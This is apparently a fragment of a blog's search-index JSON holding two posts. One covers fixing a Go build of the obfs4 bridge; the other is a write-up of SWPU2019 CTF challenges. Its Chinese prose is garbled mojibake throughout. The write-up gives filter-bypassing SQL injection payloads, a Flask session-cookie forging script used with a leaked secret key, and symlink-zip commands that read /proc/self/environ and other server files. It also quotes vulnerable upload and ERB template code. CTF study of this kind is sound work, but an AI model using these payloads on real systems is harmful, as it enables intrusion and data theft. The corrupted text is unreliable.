fileé—®é¢˜çš„è§£å†³","link":"/2020/04/03/FTP%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%85%B8%E5%9E%8B%E9%97%AE%E9%A2%98%E7%9A%84%E8%A7%A3%E5%86%B3/"},{"title":"golangç¼–è¯‘é¡¹ç›®çš„ä¸€ä¸ªå·¨å‘","text":"æœ€è¿‘åœ¨å­¦ä¸€äº›æ–°ä¸œè¥¿ï¼Œæ¶‰åŠåˆ°äº†æ­obfs4ç½‘æ¡¥ï¼Œç”±äºå®˜æ–¹æä¾›çš„ç½‘æ¡¥é¡¹ç›®æ˜¯goè¯­è¨€ç¼–å†™çš„ï¼Œä¹‹å‰åˆæ²¡å­¦è¿‡ã€ä¹Ÿæ²¡æ­è¿‡ç›¸å…³ç¯å¢ƒï¼Œå¯ä»¥è¯´åŸºæœ¬æ˜¯ä»é›¶æèµ·ï¼Œå…¶ä¸­é‡åˆ°çš„é—®é¢˜â€¦ç®—äº†ï¼Œä¸‹é¢è¿™ä¸ªé—®é¢˜å¿…é¡»è®°å½•ï¼Œç½‘ä¸Šéƒ½æ²¡æ‰¾åˆ°è§£å†³æ–¹æ¡ˆï¼Œä¸€å®šè¦è®°å½•ä¸€ä¸‹ã€‚ æœ€åˆçš„ç¯å¢ƒæ­å»ºç”±äºgolangç¼–å†™çš„é¡¹ç›®ä¼šåˆ©ç”¨gitå»å¯»æ‰¾ä¾èµ–åº“ï¼Œå› æ­¤é¦–å…ˆå°±éœ€è¦é…ç½®gitç¯å¢ƒï¼Œç”±äºä¹‹å‰çŸ¥é“äº†æ—§ç‰ˆçš„gitå¯èƒ½ä¼šå¯¼è‡´ä¸€äº›é—®é¢˜ï¼Œäºæ˜¯å°±æ‰‹åŠ¨å®‰è£…äº†æ–°ç‰ˆçš„gitã€‚ é…ç½®gitç¯å¢ƒæœºå™¨ä¸Šå¯èƒ½å·²ç»å­˜åœ¨gitï¼Œå¯ä»¥é€šè¿‡å¦‚ä¸‹å‘½ä»¤æŸ¥çœ‹ç‰ˆæœ¬ä¿¡æ¯ï¼š git version å¦‚æœç‰ˆæœ¬è¾ƒä½ï¼Œæœ€å¥½å°±æ‰‹åŠ¨æ›´æ–°ä¸€ä¸‹ã€‚ é¦–å…ˆç§»é™¤æ—§ç‰ˆæœ¬çš„gitï¼š yum remove git ç„¶åå®‰è£…æœ€æ–°ç‰ˆçš„gitï¼Œå½“ç„¶æœ€å¥½å…ˆè£…ä¸€ä¸‹ä¾èµ–åº“ï¼š yum install curl-devel expat-devel gettext-devel openssl-devel zlib-devel asciidocyum install gcc perl-ExtUtils-MakeMaker ä¾èµ–åº“è£…å¥½ä¹‹åï¼Œå°±å¯ä»¥å®‰è£…ã€ç¼–è¯‘æœ€æ–°ç‰ˆçš„gitäº†ï¼š [root@guest ~]# cd /usr/local/src/[root@guest src]# wget https://www.kernel.org/pub/software/scm/git/git-2.26.0.tar.xz[root@guest src]# tar -vxf git-2.26.0.tar.xz[root@guest src]# cd git-2.26.0[root@guest git-2.26.0]# make prefix=/usr/local/git all[root@guest git-2.26.0]# make prefix=/usr/local/git install[root@guest git-2.26.0]# echo &quot;export PATH=$PATH:/usr/local/git/bin&quot; &gt;&gt; /etc/profile[root@guest git-2.26.0]# source /etc/profile è‡³æ­¤ï¼Œæœ€æ–°ç‰ˆgité…ç½®å®Œæ¯•ï¼Œå¯ä»¥æŸ¥çœ‹å…¶ç‰ˆæœ¬ä¿¡æ¯ï¼š [root@guest git-2.26.0]# git versiongit version 2.26.0 é…ç½®golangç¯å¢ƒgolangçš„ç¯å¢ƒæ˜¯å‚è€ƒç½‘ä¸Šçš„åšå®¢è£…çš„ï¼Œå…¶å®å°±æ˜¯åˆ©ç”¨yumå®‰è£…ï¼š [root@guest ~]# yum -y install golang æœ€åˆè£…å®Œä¹‹åä¹Ÿå°±æ²¡æœ‰ç®¡gitçš„ç‰ˆæœ¬äº†ï¼Œç›´æ¥æŠŠobfs4çš„é¡¹ç›®æ”¾åœ¨äº†go/srcä¸‹è¿›è¡Œç¼–è¯‘äº†ã€‚ æŠ¥é”™ä¿¡æ¯åˆ©ç”¨ä¸Šé¢çš„æ–¹æ³•æ­å»ºçš„ç¯å¢ƒç›´æ¥å»ç¼–è¯‘é¡¹ç›®ï¼Œç»“æœä¸€ç›´æŠ¥é”™ï¼š ä¸ç®¡æ˜¯æ”¹é¡¹ç›®ç›®å½•ã€æ¢æ–¹å¼ç¼–è¯‘ï¼Œä¸€ç›´éƒ½æ˜¯æ‰¾ä¸åˆ°ä¾èµ–åº“çš„é”™è¯¯ï¼Œç”šè‡³æƒ³åˆ°äº†ä¼šä¸ä¼šæ˜¯ä½œè€…çš„é¡¹ç›®æœ‰é—®é¢˜ã€è¿˜ç»™ä½œè€…å‘äº†å°é‚®ä»¶â€¦è¯·é¡¹ç›®ä½œè€…ä¸è¦æ‰“æˆ‘å•Šâ€¦ ç»“æœä¸¤å¤©éƒ½æ²¡æå®šâ€¦éƒ½è¦å¿ƒç°æ„å†·äº†â€¦ å¶ç„¶ä¹‹é—´ï¼Œæˆ‘å‘ç°å¸è½½golangçš„æ—¶å€™æç¤ºä¼šåŒæ—¶å¸è½½gitï¼Œå—¯ï¼Ÿï¼Ÿï¼Ÿï¼ï¼ï¼è¿™ä¸ªgitè¿˜æ˜¯1.8ç‰ˆæœ¬çš„ï¼Œå—¯ï¼Ÿï¼Ÿï¼Ÿï¼ï¼ï¼ äºæ˜¯å°±å®éªŒäº†ä¸€ä¸‹ï¼Œæˆ‘é‡æ–°ç”¨yumè£…golangç»“æœç¡®å®æç¤ºä¼šåŒæ—¶è£…git-1.8.1ï¼Œè£…ä¸Šä¹‹ååˆçœ‹äº†ä¸€ä¸‹gitç‰ˆæœ¬ï¼Œ1.8.1ï¼Œwocâ€¦é—®é¢˜ä¸ä¼šåœ¨è¿™å§â€¦å®è·µè¯å®ï¼Œé—®é¢˜å°±åœ¨è¿™ã€‚ è§£å†³é—®é¢˜é¦–å…ˆæŠŠå½“å‰çš„golangç›´æ¥yum removeæ‰ï¼Œæœ€å¥½æ¸…çš„å¹²å‡€ä¸€äº›ï¼š rm -rf /usr/local/go gitæœ€æ–°ç‰ˆçš„é…ç½®å°±ä¸è¯´äº†ï¼Œä¸Šé¢å·²ç»è®²åˆ°äº†ï¼Œè¯´ä¸€ä¸‹æœ€æ–°ç‰ˆgolangçš„å®‰è£…é…ç½®ã€‚ åˆ°å®˜ç½‘ä¸‹è½½æœ€æ–°ç‰ˆçš„å‹ç¼©åŒ…ï¼Œæ‹–åˆ°vpsé‡Œï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ç›´æ¥wgetï¼Œä¹‹åè¿›è¡Œè§£å‹ï¼š tar -zxf go1.x.x.linux-amd64.tar.gz -C /usr/local ç„¶åé…ç½®ç¯å¢ƒå˜é‡ï¼š vi /etc/profile åœ¨profileæœ«å°¾æ·»åŠ å¦‚ä¸‹å†…å®¹ï¼š #golang env configexport GO111MODULE=onexport GOROOT=/usr/local/go export GOPATH=/home/gopathexport PATH=$PATH:$GOROOT/bin:$GOPATH/bin è¿™é‡Œçš„GO111MODULEé…ç½®æ˜¯go1.11åå‡ºçš„ä¸€ç§æ–°çš„åŒ…ç®¡ç†go modulesæ–¹å¼ä»£æ›¿vendoræœºåˆ¶ï¼Œå¯ä»¥ä¸éœ€è¦GOPATHï¼Œé¡¹ç›®ä»£ç ä¹Ÿä¸ä¸€å®šè¦æ”¾åœ¨GOPATHä¸‹é¢ã€‚ GO111MODULE=auto è‡ªåŠ¨ GO111MODULE=on ä½¿ç”¨go modulesï¼Œä¸ä¼šåœ¨vendorå’Œgopathæ‰¾ä¾èµ– GO111MODULE=off ä½¿ç”¨vendor æˆ–è€…gotpath ç„¶ååˆ°/homeä¸‹æ–°å»ºgopathæ–‡ä»¶å¤¹ï¼Œæ–°å»ºä¹‹åå³å¯ä½¿é…ç½®ç”Ÿæ•ˆï¼š source /etc/profile æŸ¥çœ‹golangç‰ˆæœ¬go versionå·²ç»æ˜¯æœ€æ–°ç‰ˆã€‚ æµ‹è¯•å°†obfs4çš„é¡¹ç›®æ”¾åˆ°/home/gopathä¹‹ä¸‹ï¼Œå†æ¬¡è¿›è¡Œç¼–è¯‘ï¼š å¯ä»¥çœ‹åˆ°ï¼Œå·²ç»å¯ä»¥æˆåŠŸç¼–è¯‘ã€‚ é—®é¢˜è§£å†³ï¼Œæ•£èŠ±ï¼Œä¸çŸ¥é“è¿™æ˜¯ä¸æ˜¯å…¨ç½‘ç¬¬ä¸€ä¸ªè§£å†³è¿™ä¸ªé—®é¢˜çš„æ–‡ç« ï¼Œä¸è¿‡è¿˜æ˜¯æƒ¬æ„ä¸€ä¸‹ã€‚ å‚è€ƒï¼šgitæœ€æ–°ç‰ˆé…ç½®golangæœ€æ–°ç‰ˆé…ç½®obfs4ç½‘æ¡¥é…ç½®","link":"/2020/04/01/golang%E7%BC%96%E8%AF%91%E9%A1%B9%E7%9B%AE%E7%9A%84%E4%B8%80%E4%B8%AA%E5%B7%A8%E5%9D%91/"},{"title":"SWPU2019å¤ç°","text":"ä¸€ç›´æƒ³ç€å¤ç°æ¥ç€ï¼Œè®°äº‹æœ¬é‡Œä¹Ÿè®°å½•äº†å‡ ä¸ªæœˆäº†â€¦ğŸ¤£ Web1äºŒæ¬¡æ³¨å…¥ã€æ— åˆ—åæŸ¥è¯¢ï¼Œå¯¹MariaDBè¿‡æ»¤information_schemaçš„æ³¨å…¥ã€‚ é¢˜ç›®åˆ†æè¿›å…¥é¢˜ç›®æ³¨å†Œå¹¶ç™»é™†ä¹‹åï¼Œå‘ç°å¯ä»¥å‘å¸ƒå¹¿å‘Šï¼Œå¹¶ä¸”åœ¨å¹¿å‘Šåçš„åœ°æ–¹å­˜åœ¨äºŒæ¬¡æ³¨å…¥(æäº¤å†…å®¹çš„æ—¶å€™æ³¨å…¥ä¸æ‰§è¡Œï¼ŒæŸ¥è¯¢çš„æ—¶å€™æ‰æ‰§è¡Œ)ï¼Œç»è¿‡æµ‹è¯•å‘ç°orè¢«banäº†ï¼ŒåŒæ—¶ç©ºæ ¼ä¹Ÿä¼šè¢«æ›¿æ¢ä¸ºç©ºï¼Œå› æ­¤éœ€è¦åˆ©ç”¨/**/ç»•è¿‡å¯¹ç©ºæ ¼çš„è¿‡æ»¤ã€‚æ—¢ç„¶orè¢«banæ‰äº†ï¼Œé‚£ä¹ˆä¾¿ä¸èƒ½å†åˆ©ç”¨order byæ³¨å…¥æŸ¥åˆ—æ•°äº†ï¼Œæ­¤æ—¶åªèƒ½ç›´æ¥åˆ©ç”¨union selectè¿›è¡Œåˆ—åçš„éå†äº†ã€‚åœ¨æµ‹è¯•çš„è¿‡ç¨‹ä¸­å‘ç°äº†åå°æ•°æ®åº“æ˜¯MariaDBåŒæ—¶orè¢«banæ‰ï¼Œå› æ­¤information_schemaä¸èƒ½ç”¨ï¼Œæ­¤æ—¶æƒ³åˆ°åˆ©ç”¨mysql.innodb_table_statsæ¥æŸ¥è¡¨å(è¿™ä¸ªåœ°æ–¹å¯ä»¥å‚è€ƒï¼šhttps://mariadb.com/kb/en/mysqlinnodb_table_stats/)ï¼Œä½†æ˜¯æ— æ³•è·å–åˆ—åï¼Œå› æ­¤æœ€ç»ˆè·å–flagéœ€è¦å€ŸåŠ©`æ— åˆ—åæ³¨å…¥`äº†(å‚è€ƒï¼šhttps://blog.csdn.net/chasingin/article/details/103476001)ã€‚ ç°åœ¨æ€è·¯å°±å¾ˆæ˜ç¡®äº†ï¼Œé¦–å…ˆåˆ©ç”¨union selectæµ‹è¯•å‡ºåˆ—æ•°ï¼Œç„¶ååˆ©ç”¨mysql.innodb_table_statsæŸ¥å‡ºè¡¨åï¼Œæœ€åæ— åˆ—åæ³¨å…¥æ‹¿åˆ°flagã€‚ è§£é¢˜é¦–å…ˆæŸ¥åˆ—æ•°ï¼š -1'/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22 åˆ©ç”¨mysql.innodb_table_statsæŸ¥è¡¨åï¼š -1'/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22 å°†åˆ—è½¬æ¢ä¸ºè¡Œï¼Œè¿›è¡Œæ— åˆ—åæ³¨å…¥ï¼š -1'union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1,2,3/**/as/**/b/**/union/**/select*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22 å¦å¤–è¡¥å……ä¸€ç‚¹ï¼Œå¦‚æœåå°æ•°æ®åº“æ˜¯mysqlï¼Œä½†æ˜¯information_schemaè¢«banæ‰ä¹‹åï¼Œå¦‚æœmysqlæ²¡æœ‰å¼€å¯innodbå­˜å‚¨å¼•æ“åˆ™å¯åˆ©ç”¨sysæ•°æ®åº“``schema_auto_increment_columnså’Œschema_table_statistics_with_bufferæ¥ç»•è¿‡ï¼Œä½†æ˜¯æœ¬é¢˜åå°æ•°æ®åº“æ˜¯MariaDBï¼Œä¸Šè¿°æ–¹æ³•ä¾¿ä¸å¯ç”¨ï¼Œä¸è¿‡ç»™ä¸€ä¸‹æˆ‘åšé¢˜çš„æ—¶å€™æµ‹è¯•çš„payloadï¼Œé‡åˆ°ç±»ä¼¼é¢˜ç›®å¯èƒ½ç”¨å¾—ä¸Šï¼š -1'union/**/select/**/1,(select/**/group_concat(table_name)from/**/sys.schema_auto_increment_column/**/where/**/table_schema=database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22-1'union/**/select/**/1,(select/**/group_concat(table_name)from/**/sys.schema_table_statistics_with_buffer/**/where/**/table_schema=database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22 ç„¶åå†åˆ©ç”¨joinæˆ–join...usingè¿›è¡Œæ— åˆ—åæŸ¥è¯¢å³å¯ã€‚ç»•è¿‡information_schemaå¯ä»¥å‚è€ƒï¼šhttps://www.anquanke.com/post/id/193512 easy_pythonè€ƒå¯ŸJWTä¼ªé€ æ”»å‡»ï¼Œè½¯é“¾æ¥ä»»æ„æ–‡ä»¶è¯»å– é¢˜ç›®åˆ†æè¿›å…¥é¢˜ç›®æ˜¯ä¸€ä¸ªç™»å½•æ¡†ï¼Œä»»æ„ç”¨æˆ·åå¯†ç ç™»å½•ï¼Œå‘ç°å¯ä»¥è¿›è¡Œæ–‡ä»¶ä¸Šä¼ ï¼š ç›´æ¥ç‚¹æŒ‰é’®åé¦ˆæ²¡æœ‰æƒé™â€¦ çœ‹æºç å‘ç°äº†404 not foundçš„æç¤ºï¼Œç½‘ä¸Šçš„wpæ˜¯è¿™ä¹ˆè¯´çš„ï¼š åœ¨flaskä¸­ï¼Œå¯ä»¥ä½¿ç”¨app.errorhandler()è£…é¥°å™¨æ¥æ³¨å†Œé”™è¯¯å¤„ç†å‡½æ•°ï¼Œå‚æ•°æ˜¯HTTP é”™è¯¯çŠ¶æ€ç æˆ–è€…ç‰¹å®šçš„å¼‚å¸¸ç±»ï¼Œç”±æ­¤æˆ‘ä»¬å¯ä»¥è”æƒ³åˆ°åœ¨404é”™è¯¯ä¸­ä¼šæœ‰ä¸œè¥¿å­˜åœ¨ã€‚ é‚£ä¹ˆæˆ‘ä»¬æ„é€ ä¸€ä¸ªä»»æ„çš„æ–‡ä»¶åˆ°urlä¸­å»è®¿é—®ï¼Œçœ‹ä¸€ä¸‹å›æ˜¾ï¼š å‘ç°å“åº”å¤´ä¸­å­˜åœ¨Swpuctf_csrf_token: U0VDUkVUX0tFWTprZXlxcXF3d3dlZWUhQCMkJV4mKg== è§£ç å¾—åˆ°ï¼šSECRET_KEY:keyqqqwwweee!@#$%^&amp;* ç»“åˆå‰é¢çš„æƒé™è¦æ±‚ï¼ŒçŒœæµ‹æ˜¯JWTä¼ªé€ äº†ï¼Œä½†æ˜¯è¿™ä¸ªé¢˜ä¸­çš„JWTç›´æ¥å»è§£base64çš„ç»“æœæ˜¯è¿™æ ·çš„ï¼š{&quot;id&quot;:{&quot; b&quot;:&quot;MTAw&quot;},&quot;is_login&quot;:true,&quot;password&quot;:&quot;123&quot;,&quot;username&quot;:&quot;123&quot;} æœŸåˆä¸€ç›´ä»¥è¿™ç§ç»“æ„å»ä¼ªé€ ï¼ŒæœåŠ¡å™¨å°±è€æ˜¯åé¦ˆ500 errorï¼Œåæ¥å‚è€ƒç½‘ä¸Šä¸€ç¯‡wpä¸­è®²çš„è§£JWTç”¨çš„æ˜¯å¦‚ä¸‹çš„ä»£ç ï¼š \"\"\" Flask Session Cookie Decoder/Encoder \"\"\"__author__ = 'Wilson Sumanang, Alexandre ZANNI'# standard importsimport sysimport zlibfrom itsdangerous import base64_decodeimport ast# Abstract Base Classes (PEP 3119)if sys.version_info[0] &lt; 3: # &lt; 3.0 raise Exception('Must be using at least Python 3')elif sys.version_info[0] == 3 and sys.version_info[1] &lt; 4: # &gt;= 3.0 &amp;&amp; &lt; 3.4 from abc import ABCMeta, abstractmethodelse: # &gt; 3.4 from abc import ABC, abstractmethod# Lib for argument parsingimport argparse# external Importsfrom flask.sessions import SecureCookieSessionInterfaceclass MockApp(object): def __init__(self, secret_key): self.secret_key = secret_keyif sys.version_info[0] == 3 and sys.version_info[1] &lt; 4: # &gt;= 3.0 &amp;&amp; &lt; 3.4 class FSCM(metaclass=ABCMeta): def encode(secret_key, session_cookie_structure): \"\"\" Encode a Flask session cookie \"\"\" try: app = MockApp(secret_key) session_cookie_structure = dict(ast.literal_eval(session_cookie_structure)) si = SecureCookieSessionInterface() s = si.get_signing_serializer(app) return s.dumps(session_cookie_structure) except Exception as e: return \"[Encoding error] {}\".format(e) raise e def decode(session_cookie_value, secret_key=None): \"\"\" Decode a Flask cookie \"\"\" try: if(secret_key==None): compressed = False payload = session_cookie_value if payload.startswith('.'): compressed = True payload = payload[1:] data = payload.split(\".\")[0] data = base64_decode(data) if compressed: data = zlib.decompress(data) return data else: app = MockApp(secret_key) si = SecureCookieSessionInterface() s = si.get_signing_serializer(app) return s.loads(session_cookie_value) except Exception as e: return \"[Decoding error] {}\".format(e) raise eelse: # &gt; 3.4 class FSCM(ABC): def encode(secret_key, session_cookie_structure): \"\"\" Encode a Flask session cookie \"\"\" try: app = MockApp(secret_key) session_cookie_structure = dict(ast.literal_eval(session_cookie_structure)) si = SecureCookieSessionInterface() s = si.get_signing_serializer(app) return s.dumps(session_cookie_structure) except Exception as e: return \"[Encoding error] {}\".format(e) raise e def decode(session_cookie_value, secret_key=None): \"\"\" Decode a Flask cookie \"\"\" try: if(secret_key==None): compressed = False payload = session_cookie_value if payload.startswith('.'): compressed = True payload = payload[1:] data = payload.split(\".\")[0] data = base64_decode(data) if compressed: data = zlib.decompress(data) return data else: app = MockApp(secret_key) si = SecureCookieSessionInterface() s = si.get_signing_serializer(app) return s.loads(session_cookie_value) except Exception as e: return \"[Decoding error] {}\".format(e) raise eif __name__ == \"__main__\": # Args are only relevant for __main__ usage ## Description for help parser = argparse.ArgumentParser( description='Flask Session Cookie Decoder/Encoder', epilog=\"Author : Wilson Sumanang, Alexandre ZANNI\") ## prepare sub commands subparsers = parser.add_subparsers(help='sub-command help', dest='subcommand') ## create the parser for the encode command parser_encode = subparsers.add_parser('encode', help='encode') parser_encode.add_argument('-s', '--secret-key', metavar='&lt;string&gt;', help='Secret key', required=True) parser_encode.add_argument('-t', '--cookie-structure', metavar='&lt;string&gt;', help='Session cookie structure', required=True) ## create the parser for the decode command parser_decode = subparsers.add_parser('decode', help='decode') parser_decode.add_argument('-s', '--secret-key', metavar='&lt;string&gt;', help='Secret key', required=False) parser_decode.add_argument('-c', '--cookie-value', metavar='&lt;string&gt;', help='Session cookie value', required=True) ## get args args = parser.parse_args() ## find the option chosen if(args.subcommand == 'encode'): if(args.secret_key is not None and args.cookie_structure is not None): print(FSCM.encode(args.secret_key, args.cookie_structure)) elif(args.subcommand == 'decode'): if(args.secret_key is not None and args.cookie_value is not None): print(FSCM.decode(args.cookie_value,args.secret_key)) elif(args.cookie_value is not None): print(FSCM.decode(args.cookie_value)) ç”¨æ³•å¦‚ä¸‹ï¼š è§£å¯†:python flask_session_manager.py decode -c -s # -cæ˜¯flask cookieé‡Œçš„sessionå€¼ -så‚æ•°æ˜¯SECRET_KEYåŠ å¯†:python flask_session_manager.py encode -s -t # -så‚æ•°æ˜¯SECRET_KEY -tå‚æ•°æ˜¯sessionçš„å‚ç…§æ ¼å¼ï¼Œä¹Ÿå°±æ˜¯sessionè§£å¯†åçš„æ ¼å¼ æŒ‰ç…§è¿™ä¸ªä»£ç è§£JWTç»“æœå¦‚ä¸‹ï¼š python3 flask_session_manager.py decode -c \"eyJpZCI6eyIgYiI6Ik1UQXcifSwiaXNfbG9naW4iOnRydWUsInBhc3N3b3JkIjoiMTIzIiwidXNlcm5hbWUiOiIxMjMifQ.XnSqQQ.0VoijfPiLI6lwy9zvZ-yk5U5Lv8\" -s \"keyqqqwwweee!@#$%^&amp;*\"{'id': b'100', 'is_login': True, 'password': '123', 'username': '123'}è¿™é‡Œå°±å¯ä»¥çœ‹å‡ºä¸ä¸€æ ·äº†ï¼Œç°åœ¨è¿˜æ²¡ææ‡‚åŸå› ... python3 flask_session_manager.py encode -s \"keyqqqwwweee!@#$%^&amp;*\" -t \"{'id': b'1', 'is_login': True, 'password': '123', 'username': '123'}\"eyJpZCI6eyIgYiI6Ik1RPT0ifSwiaXNfbG9naW4iOnRydWUsInBhc3N3b3JkIjoiMTIzIiwidXNlcm5hbWUiOiIxMjMifQ.XnSu2A.SeLyR45y3lQcF1dRjwzQw5Y-3TEè¿™é‡Œæˆ‘ä»¬ä¼ªé€ id:b'1'çš„ç”¨æˆ·sessionè¿›è¡Œç™»å½• åˆ©ç”¨ä¼ªé€ çš„sessionï¼ŒæˆåŠŸç™»å½•ï¼š æŸ¥çœ‹æºç å¦‚ä¸‹ï¼š @app.route('/upload',methods=['GET','POST'])def upload(): if session['id'] != b'1': return render_template_string(temp) if request.method=='POST': m = hashlib.md5() name = session['password'] name = name+'qweqweqwe' name = name.encode(encoding='utf-8') m.update(name) md5_one= m.hexdigest() n = hashlib.md5() ip = request.remote_addr ip = ip.encode(encoding='utf-8') n.update(ip) md5_ip = n.hexdigest() f=request.files['file'] basepath=os.path.dirname(os.path.realpath(__file__)) path = basepath+'/upload/'+md5_ip+'/'+md5_one+'/'+session['username']+\"/\" path_base = basepath+'/upload/'+md5_ip+'/' filename = f.filename pathname = path+filename if \"zip\" != filename.split('.')[-1]: return 'zip only allowed' if not os.path.exists(path_base): try: os.makedirs(path_base) except Exception as e: return 'error' if not os.path.exists(path): try: os.makedirs(path) except Exception as e: return 'error' if not os.path.exists(pathname): try: f.save(pathname) except Exception as e: return 'error' try: cmd = \"unzip -n -d \"+path+\" \"+ pathname if cmd.find('|') != -1 or cmd.find(';') != -1: waf() return 'error' os.system(cmd) except Exception as e: return 'error' unzip_file = zipfile.ZipFile(pathname,'r') unzip_filename = unzip_file.namelist()[0] if session['is_login'] != True: return 'not login' try: if unzip_filename.find('/') != -1: shutil.rmtree(path_base) os.mkdir(path_base) return 'error' image = open(path+unzip_filename, \"rb\").read() resp = make_response(image) resp.headers['Content-Type'] = 'image/png' return resp except Exception as e: shutil.rmtree(path_base) os.mkdir(path_base) return 'error' return render_template('upload.html')@app.route('/showflag')def showflag(): if True == False: image = open(os.path.join('./flag/flag.jpg'), \"rb\").read() resp = make_response(image) resp.headers['Content-Type'] = 'image/png' return resp else: return \"can't give you\" ä»¥æ­£å¸¸é€»è¾‘æ¥çœ‹ï¼Œè¿™é‡Œçš„åŠŸèƒ½å°±æ˜¯å®¢æˆ·ç«¯ä¸Šä¼ ä¸€ä¸ªå‹ç¼©åçš„å›¾ç‰‡ï¼ŒæœåŠ¡ç«¯ä¼šè§£å‹ç¼©åå¹¶è¯»å–å›¾ç‰‡è¿”å›å®¢æˆ·ç«¯ã€‚è¿™é‡Œæˆ‘ä»¬å¯ä»¥ä¸Šä¼ ä¸€ä¸ªè½¯é“¾æ¥å‹ç¼©åŒ…ï¼Œæ¥è¯»å–å…¶ä»–æ•æ„Ÿæ–‡ä»¶è€Œä¸æ˜¯æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶ã€‚ ç»“åˆ showflag()å‡½æ•°çš„æºç ï¼Œæˆ‘ä»¬å¯ä»¥å¾—çŸ¥ flag.jpg æ”¾åœ¨ flask åº”ç”¨æ ¹ç›®å½•çš„flagç›®å½•ä¸‹ã€‚é‚£ä¹ˆæˆ‘ä»¬åªè¦åˆ›å»ºä¸€ä¸ªåˆ°/xxx/flask/flag/flag.jpgçš„è½¯é“¾æ¥ï¼Œå³å¯è¯»å– flag.jpg æ–‡ä»¶ã€‚ ä¸¤ç§æ–¹å¼æ„é€ ï¼š 1ã€åœ¨ linux ä¸­ï¼Œ/proc/self/cwd/ä¼šæŒ‡å‘è¿›ç¨‹çš„å½“å‰ç›®å½•ï¼Œé‚£ä¹ˆåœ¨ä¸çŸ¥é“ flask å·¥ä½œç›®å½•æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨/proc/self/cwd/flag/flag.jpgæ¥è®¿é—® flag.jpgã€‚ å‘½ä»¤å¦‚ä¸‹ï¼š ln -s /proc/self/cwd/flag/flag.jpg qwe zip -ry qwe.zip qwe 2ã€åœ¨ linux ä¸­ï¼Œ/proc/self/environæ–‡ä»¶é‡ŒåŒ…å«äº†è¿›ç¨‹çš„ç¯å¢ƒå˜é‡ï¼Œå¯ä»¥ä»ä¸­è·å– flask åº”ç”¨çš„ç»å¯¹è·¯å¾„ï¼Œå†é€šè¿‡ç»å¯¹è·¯å¾„åˆ¶ä½œè½¯é“¾æ¥æ¥è¯»å– flag.jpg (PSï¼šåœ¨æµè§ˆå™¨ä¸­ï¼Œæˆ‘ä»¬æ— æ³•ç›´æ¥çœ‹åˆ°/proc/self/environçš„å†…å®¹ï¼Œåªéœ€è¦ä¸‹è½½åˆ°æœ¬åœ°ï¼Œç”¨ notepad++æ‰“å¼€å³å¯) å‘½ä»¤å¦‚ä¸‹ï¼š ln -s /proc/self/environ qqq zip -ry qqq.zip qqq ln -s /ctf/hgfjakshgfuasguiasguiaaui/myflask/flag/flag.jpg www zip -ry [www.zip\\]\\(http://www.zip\\) www è§£é¢˜åœ¨ä¸Šä¸€æ­¥ä¸­ï¼Œæˆ‘ä»¬å·²ç»æˆåŠŸæ‹¿åˆ°ä¸Šä¼ çš„æƒé™äº†ï¼Œç°åœ¨åˆ°linuxä¸­ç”Ÿæˆè¯»å–flagçš„è½¯è¿æ¥ï¼Œä¸Šä¼ ä¹‹åæœåŠ¡ç«¯å›æ˜¾å¦‚ä¸‹ï¼š å› ä¸ºæ˜¯ä¸€ä¸ªæœ‰é—®é¢˜çš„å›¾ç‰‡ï¼Œæ— æ³•æ˜¾ç¤ºï¼Œå…¶å®å°±æ˜¯BUUæ”¹äº†ï¼Œå®ƒæœ¬è´¨ä¸Šè¿˜æ˜¯ä¸€ä¸ªtxtï¼Œä¸‹è½½ä¸‹æ¥å³å¯æ‹¿åˆ°flagã€‚ Flag Shopè€ƒå¯ŸJWTä¼ªé€ ï¼Œrubyçš„ERBæ¨¡æ¿æ³¨å…¥ã€‚åè€…æ˜¯ç¬¬ä¸€æ¬¡æ¥è§¦ é¢˜ç›®åˆ†æè¿›å…¥é¢˜ç›®å‘ç°å¯ä»¥ä¹°flagï¼Œä½†æ˜¯å¾ˆè´µï¼Œè¿™ä¸ªæ—¶å€™åˆå¯ä»¥è¿›è¡Œworkæ‹¿jklï¼Œè¿™ç‚¹åˆ°å•¥æ—¶å€™å»å•Šâ€¦ ä¸è¿‡å­˜åœ¨robots.txtï¼Œæç¤ºäº†filebakeçš„å­˜åœ¨ï¼š è®¿é—®filebackæ‹¿åˆ°æºç ï¼š require 'sinatra'require 'sinatra/cookies'require 'sinatra/json'require 'jwt'require 'securerandom'require 'erb'set :public_folder, File.dirname(__FILE__) + '/static'FLAGPRICE = 1000000000000000000000000000ENV[\"SECRET\"] = SecureRandom.hex(64)configure do enable :logging file = File.new(File.dirname(__FILE__) + '/../log/http.log',\"a+\") file.sync = true use Rack::CommonLogger, fileendget \"/\" do redirect '/shop', 302endget \"/filebak\" do content_type :text erb IO.binread __FILE__endget \"/api/auth\" do payload = { uid: SecureRandom.uuid , jkl: 20} auth = JWT.encode payload,ENV[\"SECRET\"] , 'HS256' cookies[:auth] = authendget \"/api/info\" do islogin auth = JWT.decode cookies[:auth],ENV[\"SECRET\"] , true, { algorithm: 'HS256' } json({uid: auth[0][\"uid\"],jkl: auth[0][\"jkl\"]})endget \"/shop\" do erb :shopendget \"/work\" do islogin auth = JWT.decode cookies[:auth],ENV[\"SECRET\"] , true, { algorithm: 'HS256' } auth = auth[0] unless params[:SECRET].nil? if ENV[\"SECRET\"].match(\"#{params[:SECRET].match(/[0-9a-z]+/)}\") puts ENV[\"FLAG\"] end end if params[:do] == \"#{params[:name][0,7]} is working\" then auth[\"jkl\"] = auth[\"jkl\"].to_i + SecureRandom.random_number(10) auth = JWT.encode auth,ENV[\"SECRET\"] , 'HS256' cookies[:auth] = auth ERB::new(\"&lt;script&gt;alert('#{params[:name][0,7]} working successfully!')&lt;/script&gt;\").result endendpost \"/shop\" do islogin auth = JWT.decode cookies[:auth],ENV[\"SECRET\"] , true, { algorithm: 'HS256' } if auth[0][\"jkl\"] &lt; FLAGPRICE then json({title: \"error\",message: \"no enough jkl\"}) else auth &lt;&lt; {flag: 